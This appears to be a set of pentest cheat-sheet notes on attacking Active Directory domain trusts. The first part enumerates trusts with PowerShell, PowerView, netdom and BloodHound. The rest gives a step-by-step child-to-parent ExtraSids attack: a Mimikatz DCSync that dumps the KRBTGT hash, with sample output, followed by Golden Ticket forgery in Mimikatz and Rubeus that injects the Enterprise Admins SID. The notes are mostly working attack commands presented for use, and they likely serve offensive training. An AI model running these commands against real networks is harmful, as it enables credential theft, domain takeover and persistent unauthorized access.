# Native Powershell Modules

## Enumerating Trust Relationships

```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

# With Powerview

```powershell
(powerview)> Get-DomainTrust 
```

## Using Get-DomainTrustMapping

```powershell
(powerview)> Get-DomainTrustMapping
```

## Checking Users in the Child Domain using Get-DomainUser

```powershell
(powerview)> Get-DomainUser -Domain [child domain] | select SamAccountName
```

Another tool we can use to get Domain Trust is netdom. The netdom query sub-command of the netdom command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.


## Using netdom to query domain trust

```bash
netdom query /domain:[ domain] trust
```

## Using netdom to query domain controllers
```bash
netdom query /domain:[domain] dc
```

## Using netdom to query workstations and servers
```bash
netdom query /domain:[domain] workstation
```

# Using BloodHound

We can also use BloodHound to visualize these trust relationships by using the **Map Domain Trusts** pre-built query. Here we can easily see that two bidirectional trusts exist.

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.

This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform **DCSync** and create a **[Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)** or a **Kerberos ticket-granting ticket (TGT)**, which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

# ExtraSids Attack - Mimikatz

To perform this attack after compromising a child domain, we need the following:

* The KRBTGT hash for the child domain
* The SID for the child domain
* The name of a target user in the child domain (does not need to exist!)
* The FQDN of the child domain.
* The SID of the Enterprise Admins group of the root domain.
* With this data collected, the attack can be performed with Mimikatz.

# Obtaining the KRBTGT Account's NT Hash using Mimikatz

Perform **DCSYNC** attack to get **NTLM** hash.

```bash
(mimikatz)> lsadump::dcsync /user:[domain]\krbtgt
...

Hash NTLM: 9d765b482771505cbe97411065964d5f
ntlm- 0: 9d765b482771505cbe97411065964d5f
lm  - 0: 69df324191d4a80f0ed100c10f20561e

```

### Get SID Domain

```powershell
(powerview)> Get-DomainSID
```
### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```powershell
(PS)> Get-ADGroup -Identity "Enterprise Admins" 
(powerview)> Get-DomainGroup -Domain [domain] -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
At this point, we have gathered the following data points:

* The KRBTGT hash for the child domain: XXXXXXXXXXXXXXX
* The SID for the child domain: S-1-5-XXXXXXXXXXXX
* The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: **hacker**
* The FQDN of the child domain: xxxx.yyyy.ccc
* The SID of the Enterprise Admins group of the root domain: S-1-5-21-AAAAAAAAAAAAAAAAAAAAAAAAAA


### Ready! to Attack
Creating a Golden Ticket with Mimikatz

```powershell
(mimikatz) # kerberos::golden /user:hacker /domain:[domain] /sid:S-1-5-21-XXXXXXXXXXXXX /krbtgt:[KRBTGT hash] /sids:S-1-5-21-AAAAAAAAAAAAAAAAAAAAAAAA /ptt
(PS) > klist 
```
From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.

## ExtraSids Attack - Rubeus

```powershell
.\Rubeus.exe golden /rc4:[KRBTGT hash] /domain:[domain] /sid:S-1-5-21-XXXXXXXXXXXXXXXXXXX  /sids:S-1-5-21-AAAAAAAAAAAAAAAAAAA /user:hacker /ptt
(PS)> klist
```
